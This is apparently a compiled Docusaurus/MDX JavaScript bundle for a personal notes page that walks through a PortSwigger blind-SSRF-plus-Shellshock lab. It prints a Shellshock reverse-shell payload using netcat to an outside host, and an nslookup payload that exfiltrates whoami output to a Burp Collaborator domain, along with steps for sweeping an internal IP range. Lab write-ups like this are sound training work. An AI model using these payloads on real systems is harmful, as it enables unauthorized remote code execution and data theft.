"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[2847],{3905:function(e,t,n){n.d(t,{Zo:function(){return p},kt:function(){return d}});var r=n(7294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var s=r.createContext({}),c=function(e){var t=r.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},p=function(e){var t=c(e.components);return r.createElement(s.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},h=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,a=e.originalType,s=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),h=c(n),d=o,b=h["".concat(s,".").concat(d)]||h[d]||u[d]||a;return n?r.createElement(b,i(i({ref:t},p),{},{components:n})):r.createElement(b,i({ref:t},p))}));function d(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var a=n.length,i=new Array(a);i[0]=h;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l.mdxType="string"==typeof e?e:o,i[1]=l;for(var c=2;c<a;c++)i[c]=n[c];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}h.displayName="MDXCreateElement"},4505:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return l},contentTitle:function(){return s},metadata:function(){return c},toc:function(){return p},default:function(){return h}});var r=n(7462),o=n(3366),a=(n(7294),n(3905)),i=["components"],l={tags:["ssrf","shellshock"]},s=void 0,c={unversionedId:"portswigger/SSRF/SSRF-and-Shellshock",id:"portswigger/SSRF/SSRF-and-Shellshock",title:"SSRF-and-Shellshock",description:"imply identifying a blind SSRF vulnerability that can trigger out-of-band HTTP requests doesn't in itself provide a route to exploitability. Since you cannot view the response from the back-end request, the behavior can't be used to explore content on systems that the application server can reach. However, it can still be leveraged to probe for other vulnerabilities on the server itself or on other back-end systems. You can blindly sweep the internal IP address space, sending payloads designed to detect well-known vulnerabilities. If those payloads also employ blind out-of-band techniques, then you might uncover a critical vulnerability on an unpatched internal server.",source:"@site/docs/portswigger/SSRF/SSRF-and-Shellshock.md",sourceDirName:"portswigger/SSRF",slug:"/portswigger/SSRF/SSRF-and-Shellshock",permalink:"/Cybernotes/docs/portswigger/SSRF/SSRF-and-Shellshock",tags:[{label:"ssrf",permalink:"/Cybernotes/docs/tags/ssrf"},{label:"shellshock",permalink:"/Cybernotes/docs/tags/shellshock"}],version:"current",frontMatter:{tags:["ssrf","shellshock"]},sidebar:"tutorialSidebar",previous:{title:"Intro",permalink:"/Cybernotes/docs/portswigger/SSRF/Intro"},next:{title:"SSRF-attacks-against-other-back-end-systems",permalink:"/Cybernotes/docs/portswigger/SSRF/SSRF-attacks-against-other-back-end-systems"}},p=[{value:"Challenge",id:"challenge",children:[],level:2}],u={toc:p};function h(e){var t=e.components,l=(0,o.Z)(e,i);return(0,a.kt)("wrapper",(0,r.Z)({},u,l,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("p",null,"imply identifying a blind ",(0,a.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/ssrf"},"SSRF vulnerability")," that can trigger out-of-band HTTP requests doesn't in itself provide a route to exploitability. Since you cannot view the response from the back-end request, the behavior can't be used to explore content on systems that the application server can reach. However, it can still be leveraged to probe for other vulnerabilities on the server itself or on other back-end systems. You can blindly sweep the internal IP address space, sending payloads designed to detect well-known vulnerabilities. If those payloads also employ blind out-of-band techniques, then you might uncover a critical vulnerability on an unpatched internal server."),(0,a.kt)("p",null,"Another avenue for exploiting blind SSRF vulnerabilities is to induce the application to connect to a system under the attacker's control, and return malicious responses to the HTTP client that makes the connection. If you can exploit a serious client-side vulnerability in the server's HTTP implementation, you might be able to achieve remote code execution within the application infrastructure."),(0,a.kt)("h2",{id:"challenge"},"Challenge"),(0,a.kt)("p",null,"--\x3e In this challenge we have to use shellshock payload and get the result of ",(0,a.kt)("inlineCode",{parentName:"p"},"whoami")," by running the exploit internally on ",(0,a.kt)("inlineCode",{parentName:"p"},"http://192.68.0.x:8080")," range"),(0,a.kt)("p",null,"So first i searched about shellshock payload and after reading some docs i found this payload which will get us the reverse shell !"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"() { :; }; /bin/bash -c \u2018nc 192.168.234.166 1337 -e /bin/sh\u2019\n")),(0,a.kt)("p",null,"But we can't get reverse shell because this website will only respond to burp collaborator's requests so we have to use something like ",(0,a.kt)("inlineCode",{parentName:"p"},"nslookup")," and after searching i found this payload:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"() { :;}; nslookup ${whoami}.laz1klz1e1s4rz9hvknib7s5owuoid.burpcollaborator.net\n")),(0,a.kt)("p",null,"Resources:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://github.com/opsxcq/exploit-CVE-2014-6271"},"https://github.com/opsxcq/exploit-CVE-2014-6271")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf"},"https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://www.exploit-db.com/docs/48112"},"https://www.exploit-db.com/docs/48112"))),(0,a.kt)("p",null,"--\x3e And also we will add this in ",(0,a.kt)("inlineCode",{parentName:"p"},"referrer")," header"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"http://192.168.0.0:8080\n")),(0,a.kt)("p",null,"--\x3e Now we will run the intruder attack for this ip and keep doing ",(0,a.kt)("inlineCode",{parentName:"p"},"poll now")," in collaboartor client"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(8642).Z,width:"1369",height:"431"})),(0,a.kt)("p",null,"And after running attack i found the username in lookup request."),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(8650).Z,width:"1383",height:"931"})),(0,a.kt)("p",null,"And we solved the lab!"))}h.isMDXComponent=!0},8642:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220222125752-07ac7db29cf4812457852a8deb00b615.png"},8650:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220222125828-e65653f4274b4cb3cbae00c099c74bbb.png"}}]);